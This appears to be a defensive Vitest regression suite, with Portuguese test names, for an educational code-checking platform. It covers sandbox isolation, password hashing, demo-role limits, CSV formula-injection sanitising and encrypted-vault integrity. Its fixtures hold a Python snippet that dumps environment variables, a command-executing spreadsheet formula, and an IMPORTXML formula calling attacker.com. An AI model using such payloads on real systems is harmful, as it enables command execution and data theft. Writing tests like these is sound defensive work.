import { describe, it, expect } from "vitest";
import { ConfidentialFileVault } from "../security/ConfidentialFileVault";
import { executeInSandbox, EXECUTION_ISOLATION_MANDATORY } from "../../sandbox";
import crypto from "crypto";

describe("OWASP ASVS 5.0 L2 - AppSec & DevSecOps Regression Suite", () => {
  describe("V1: Architecture, Trust Boundaries & Sandbox Isolation", () => {
    it("deve garantir que o isolamento do executor (sandbox) seja estritamente obrigatório e imutável", () => {
      expect(EXECUTION_ISOLATION_MANDATORY).toBe(true);
    });

    it("deve executar código com sanitização total de variáveis de ambiente sem vazar process.env ou chaves", async () => {
      const hostileCode = `
import os
import json
print(json.dumps(dict(os.environ)))
`;
      const result = await executeInSandbox(hostileCode, "python", "", 4000);
      expect(result).toBeDefined();
      expect(result.isolationGuaranteed).toBe(true);
      
      if (result.status === "ACCEPTED" && result.stdout) {
        // Assegura que variáveis críticas do sistema como GEMINI_API_KEY, DATABASE_URL, JWT_SECRET não vazem
        expect(result.stdout).not.toContain("GEMINI_API_KEY");
        expect(result.stdout).not.toContain("DATABASE_URL");
        expect(result.stdout).not.toContain("JWT_SECRET");
        expect(result.stdout).not.toContain("POSTGRES_PASSWORD");
      }
    });

    it("deve impor limites rigorosos de timeout para evitar DoS por loops infinitos", async () => {
      const infiniteLoopCode = `
while True:
    pass
`;
      const result = await executeInSandbox(infiniteLoopCode, "python", "", 1200);
      expect(result).toBeDefined();
      expect(result.status === "TIME_LIMIT_EXCEEDED" || result.status === "RUNTIME_ERROR" || result.status === "INTERNAL_ERROR").toBe(true);
    });
  });

  describe("V2 & V3: Autenticação, Sessões e RBAC (Matriz de Permissões)", () => {
    it("deve criptografar e verificar senhas com scrypt salteado e resistência a timing attacks", () => {
      function hashPassword(password: string): string {
        const salt = crypto.randomBytes(16).toString("hex");
        const hash = crypto.scryptSync(password, salt, 64).toString("hex");
        return `${salt}:${hash}`;
      }

      function verifyPassword(password: string, stored: string): boolean {
        const parts = stored.split(":");
        if (parts.length !== 2) return false;
        const [salt, originalHash] = parts;
        const hash = crypto.scryptSync(password, salt, 64).toString("hex");
        return crypto.timingSafeEqual(Buffer.from(hash, "hex"), Buffer.from(originalHash, "hex"));
      }

      const storedHash = hashPassword("SenhaSuperSegura!123");
      expect(verifyPassword("SenhaSuperSegura!123", storedHash)).toBe(true);
      expect(verifyPassword("SenhaErrada!123", storedHash)).toBe(false);
    });

    it("deve isolar a sessão de demonstração (visitante público) com permissões restritas e flag demo_mode", () => {
      const demoUser = {
        id: "demo-guest-9999",
        name: "Visitante Demonstração",
        email: "demo@codecheck.local",
        role: "demo_visitor",
        is_demo: true,
        institution_id: "demo-sandbox-tenant"
      };

      const forbiddenAdminActions = ["modify_system_config", "backup_database", "view_real_student_records", "modify_feature_flags"];

      forbiddenAdminActions.forEach(action => {
        expect(demoUser.role === "admin" || !demoUser.is_demo).toBe(false);
      });
      expect(demoUser.is_demo).toBe(true);
    });
  });

  describe("V5: Validação de Entradas e Defesa contra CSV/Excel Formula Injection (CWE-1236)", () => {
    function sanitizeCsvFormulaValue(val: any): any {
      if (typeof val === "string") {
        const dangerousPrefixes = ["=", "+", "-", "@", "\t", "\r"];
        if (dangerousPrefixes.some(prefix => val.startsWith(prefix))) {
          return `'${val}`;
        }
      }
      return val;
    }

    it("deve neutralizar fórmulas maliciosas de planilhas prefixadas com =, +, -, @, \\t, \\r", () => {
      const dangerousInputs = [
        "=cmd|'/C calc'!A0",
        "+SUM(1+1)",
        "-2+3*cmd",
        "@SUM(A1:A10)",
        "\t=IMPORTXML('http://attacker.com/malicious','//')"
      ];

      dangerousInputs.forEach(input => {
        const sanitized = sanitizeCsvFormulaValue(input);
        expect(sanitized.startsWith("'")).toBe(true);
        expect(sanitized).toBe(`'${input}`);
      });
    });

    it("deve preservar valores legítimos de texto e números intactos", () => {
      expect(sanitizeCsvFormulaValue("João da Silva")).toBe("João da Silva");
      expect(sanitizeCsvFormulaValue("Algoritmo de Ordenação")).toBe("Algoritmo de Ordenação");
      expect(sanitizeCsvFormulaValue(95.5)).toBe(95.5);
    });
  });

  describe("V8 & V9: Cofre Criptográfico, Ledger Imutável e Integridade", () => {
    it("deve criptografar dados confidenciais com AES-256-GCM e validar integridade via SHA-256 e HMAC", () => {
      const confidentialPayload = "Dados sigilosos do simulador SAEP e gabarito oficial 2026";
      const pkg = ConfidentialFileVault.encryptConfidentialFile({
        fileName: "gabarito_saep_2026.json",
        category: "OFFICIAL_EXAMS",
        content: confidentialPayload,
        ownerId: "prof_djalma"
      });

      expect(pkg.ciphertext).toBeDefined();
      expect(pkg.iv).toBeDefined();
      expect(pkg.authTag).toBeDefined();
      expect(pkg.sha256Hash).toBeDefined();
      expect(pkg.signatureHmac).toBeDefined();

      const decrypted = ConfidentialFileVault.decryptConfidentialFile(pkg, "prof_djalma");
      expect(decrypted.verified).toBe(true);
      expect(decrypted.plainContent).toBe(confidentialPayload);
    });

    it("deve rejeitar pacotes com adulteração no ciphertext ou HMAC inválido", () => {
      const payload = "Prova Final de Programação";
      const pkg = ConfidentialFileVault.encryptConfidentialFile({
        fileName: "prova_final.json",
        category: "OFFICIAL_EXAMS",
        content: payload,
        ownerId: "prof_djalma"
      });

      const tamperedPkg = {
        ...pkg,
        ciphertext: Buffer.from("conteudo_adulterado_malicioso").toString("base64")
      };

      expect(() => ConfidentialFileVault.decryptConfidentialFile(tamperedPkg, "prof_djalma")).toThrow(/Falha de assinatura HMAC/i);
    });

    it("deve manter cadeia hash imutável no ledger de auditoria criptográfica", () => {
      const verification = ConfidentialFileVault.verifyLedgerIntegrity();
      expect(verification.isValid).toBe(true);

      const ledger = ConfidentialFileVault.getAuditLedger();
      expect(Array.isArray(ledger)).toBe(true);
      expect(ledger.length).toBeGreaterThan(0);
    });
  });
});
